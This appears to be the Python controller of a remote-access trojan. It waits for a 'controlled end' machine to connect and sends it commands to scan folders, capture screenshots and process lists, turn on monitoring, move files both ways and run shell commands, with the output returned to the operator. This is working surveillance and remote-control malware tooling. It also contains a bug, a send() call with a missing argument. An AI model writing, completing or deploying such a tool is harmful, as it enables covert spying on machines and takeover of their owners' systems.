import socket,os,struct,string
import datetime
from pip._vendor.distlib.compat import raw_input


def put_file(target):
    file_client = socket.socket()  # 申明socket类型，同时生成socket连接对象
    file_client.bind(('10.122.193.195', 2333))
    file_client.listen(5)
    file_server, addr = file_client.accept()
    print('...connnecting from:', addr)

    if not os.path.isfile(target):
        return '该目录下不存在该文件'
    file = open(target, 'rb')
    while True:
        file_data = file.read(1024)
        if not file_data:
            break
        file_server.send(file_data)
    file.close()
    file_client.close()
    file_server.close()


def recieve_file(target):
    file_client = socket.socket()  # 申明socket类型，同时生成socket连接对象
    file_client.bind(('10.122.193.195', 2333))
    file_client.listen(5)
    file_server, addr = file_client.accept()
    print('...connnecting from:', addr)

    f = open(target, 'wb')
    while True:
        reciv = file_server.recv(10240)
        if not reciv:
            break
        f.write(reciv)
    f.close()
    file_client.close()
    file_server.close()
    print('download successfully')


def scan(server, path):
    server.send('scan'.encode("utf8"))
    server.send(path.encode("utf8"))


def send(server, i):
    server.send(i.encode("utf8"))


def process(server, path):
    server.send('process'.encode("utf-8"))
    recieve_file(path)


def screen(server, path):
    server.send('screen'.encode("utf-8"))
    recieve_file(path)


def monitor_on(server):
    server.send('monitor_on'.encode("utf-8"))


def monitor_off(server, path):
    server.send('monitor_off'.encode("utf-8"))
    recieve_file(path)


def upload(server, path, file_path):
    server.send('upload'.encode("utf8"))
    server.send(path.encode("utf8"))
    put_file(file_path)


def download(server, path, target):
    server.send('download'.encode("utf8"))
    server.send(path.encode("utf8"))
    recieve_file(target)


def shell(server, cmd):
    server.send('shell'.encode("utf8"))
    server.send(cmd.encode("utf8"))
    res = b''
    data = server.recv(10240)
    res = res + data
    return res.decode('gbk', 'ignore')


if __name__ == '__main__':
    ins_client = socket.socket()
    ins_client.bind(('10.122.193.195', 3332))
    ins_client.listen(5)

    print('waiting for connection...')
    ins_server, addr = ins_client.accept()  # ins_server 被控端   addr 被控端ip
    print('...connnecting from:', addr)
    ins_server.send('hello'.encode("utf-8"))  # 发送hello表示连接

    while True:
        i = input('指令为:')
        if i == 'scan':
            scan(ins_server, 'D:\\Imagines')
        elif i == 'send':
            send(ins_server)
        elif i == 'upload':
            upload(ins_server, 'D:\\1.png', 'F:\\无标题.png')
        elif i == 'download':
            download(ins_server, 'D:\\1.txt', 'F:\\result.txt')
        else:
            break

    ins_server.close()
    ins_client.close()